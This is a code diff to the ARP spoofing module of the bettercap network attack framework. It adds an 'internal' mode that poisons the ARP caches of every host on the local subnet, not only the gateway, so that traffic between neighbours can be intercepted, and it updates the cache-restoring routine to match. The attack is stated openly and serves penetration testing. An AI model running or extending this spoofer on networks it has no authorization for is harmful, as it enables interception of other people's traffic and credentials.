@@ -10,6 +10,8 @@ import (
 	"github.com/bettercap/bettercap/network"
 	"github.com/bettercap/bettercap/packets"
 	"github.com/bettercap/bettercap/session"
+
+	"github.com/malfunkt/iprange"
 )
 
 type ArpSpoofer struct {
@@ -18,6 +20,7 @@ type ArpSpoofer struct {
 	macs       []net.HardwareAddr
 	wAddresses []net.IP
 	wMacs      []net.HardwareAddr
+	internal   bool
 	ban        bool
 	waitGroup  *sync.WaitGroup
 }
@@ -30,12 +33,17 @@ func NewArpSpoofer(s *session.Session) *ArpSpoofer {
 		wAddresses:    make([]net.IP, 0),
 		wMacs:         make([]net.HardwareAddr, 0),
 		ban:           false,
+		internal:      false,
 		waitGroup:     &sync.WaitGroup{},
 	}
 
 	p.AddParam(session.NewStringParameter("arp.spoof.targets", session.ParamSubnet, "", "Comma separated list of IP addresses, MAC addresses or aliases to spoof, also supports nmap style IP ranges."))
 
 	p.AddParam(session.NewStringParameter("arp.spoof.whitelist", "", "", "Comma separated list of IP addresses, MAC addresses or aliases to skip while spoofing."))
+
+	p.AddParam(session.NewBoolParameter("arp.spoof.internal",
+		"false",
+		"If true, local connections among computers of the network will be spoofed, otherwise only connections going to and coming from the external network."))
 
 	p.AddHandler(session.NewModuleHandler("arp.spoof on", "",
 		"Start ARP spoofer.",
@@ -82,7 +90,9 @@ func (p *ArpSpoofer) Configure() error {
 	var targets string
 	var whitelist string
 
-	if err, targets = p.StringParam("arp.spoof.targets"); err != nil {
+	if err, p.internal = p.BoolParam("arp.spoof.internal"); err != nil {
+		return err
+	} else if err, targets = p.StringParam("arp.spoof.targets"); err != nil {
 		return err
 	} else if err, whitelist = p.StringParam("arp.spoof.whitelist"); err != nil {
 		return err
@@ -111,19 +121,55 @@ func (p *ArpSpoofer) Start() error {
 	}
 
 	return p.SetRunning(true, func() {
-		from := p.Session.Gateway.IP
-		from_hw := p.Session.Interface.HW
+		neighbours := []net.IP{}
+		nTargets := len(p.addresses) + len(p.macs)
 
-		log.Info("ARP spoofer started, probing %d targets.", len(p.addresses)+len(p.macs))
+		if p.internal {
+			list, _ := iprange.ParseList(p.Session.Interface.CIDR())
+			neighbours = list.Expand()
+			nNeigh := len(neighbours) - 2
+
+			log.Warning("ARP spoofer started targeting %d possible network neighbours of %d targets.", nNeigh, nTargets)
+		} else {
+			log.Info("ARP spoofer started, probing %d targets.", nTargets)
+		}
 
 		p.waitGroup.Add(1)
 		defer p.waitGroup.Done()
 
+		gwIP := p.Session.Gateway.IP
+		myMAC := p.Session.Interface.HW
 		for p.Running() {
-			p.sendArp(from, from_hw, true, true)
+			p.sendArp(gwIP, myMAC, true, true)
+			for _, address := range neighbours {
+				if !p.Session.Skip(address) {
+					p.sendArp(address, myMAC, true, true)
+				}
+			}
+
 			time.Sleep(1 * time.Second)
 		}
 	})
+}
+
+func (p *ArpSpoofer) unSpoof() error {
+	nTargets := len(p.addresses) + len(p.macs)
+	log.Info("Restoring ARP cache of %d targets.", nTargets)
+	p.sendArp(p.Session.Gateway.IP, p.Session.Gateway.HW, false, false)
+
+	if p.internal {
+		list, _ := iprange.ParseList(p.Session.Interface.CIDR())
+		neighbours := list.Expand()
+		for _, address := range neighbours {
+			if !p.Session.Skip(address) {
+				if realMAC, err := findMAC(p.Session, address, false); err == nil {
+					p.sendArp(address, realMAC, false, false)
+				}
+			}
+		}
+	}
+
+	return nil
 }
 
 func (p *ArpSpoofer) Stop() error {
@@ -193,6 +239,8 @@ func (p *ArpSpoofer) sendArp(saddr net.IP, smac net.HardwareAddr, check_running 
 		} else if p.isWhitelisted(ip, mac) {
 			log.Debug("%s (%s) is whitelisted, skipping from spoofing loop.", ip, mac)
 			continue
+		} else if saddr.String() == ip {
+			continue
 		}
 
 		if err, pkt := packets.NewARPReply(saddr, smac, net.ParseIP(ip), mac); err != nil {
@@ -202,15 +250,4 @@ func (p *ArpSpoofer) sendArp(saddr net.IP, smac net.HardwareAddr, check_running 
 			p.Session.Queue.Send(pkt)
 		}
 	}
-}
-
-func (p *ArpSpoofer) unSpoof() error {
-	from := p.Session.Gateway.IP
-	from_hw := p.Session.Gateway.HW
-
-	log.Info("Restoring ARP cache of %d targets.", len(p.addresses)+len(p.macs))
-
-	p.sendArp(from, from_hw, false, false)
-
-	return nil
 }
